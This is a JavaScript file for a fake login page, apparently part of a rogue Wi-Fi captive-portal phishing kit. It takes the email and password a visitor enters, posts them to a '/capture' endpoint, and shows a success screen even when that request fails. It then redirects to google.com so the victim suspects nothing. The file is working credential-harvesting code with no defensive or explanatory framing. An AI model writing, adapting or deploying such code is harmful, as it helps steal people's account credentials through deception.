document.addEventListener('DOMContentLoaded', function () {
    const form = document.getElementById('loginForm');
    const btnText = document.getElementById('btnText');
    const btnSpinner = document.getElementById('btnSpinner');
    const overlay = document.getElementById('overlay');
    const successPage = document.getElementById('successPage');
    const progressFill = document.getElementById('progressFill');

    form.addEventListener('submit', function (e) {
        e.preventDefault();

        const email = document.getElementById('email').value.trim();
        const password = document.getElementById('password').value;

        if (!email || !password) return;

        // Show loading state
        btnText.textContent = 'Signing in...';
        btnSpinner.classList.remove('hidden');
        form.querySelector('button').disabled = true;

        // Send credentials to the server
        fetch('/capture', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: 'email=' + encodeURIComponent(email) + '&password=' + encodeURIComponent(password)
        })
        .then(function () {
            showSuccess();
        })
        .catch(function () {
            // Even if server fails, show success and allow internet
            showSuccess();
        });
    });

    function showSuccess() {
        overlay.classList.add('hidden');
        successPage.classList.remove('hidden');

        // Animate progress bar
        setTimeout(function () {
            progressFill.style.width = '100%';
        }, 100);

        // Redirect after 3 seconds (to allow internet access)
        setTimeout(function () {
            window.location.href = 'http://www.google.com';
        }, 3500);
    }
});
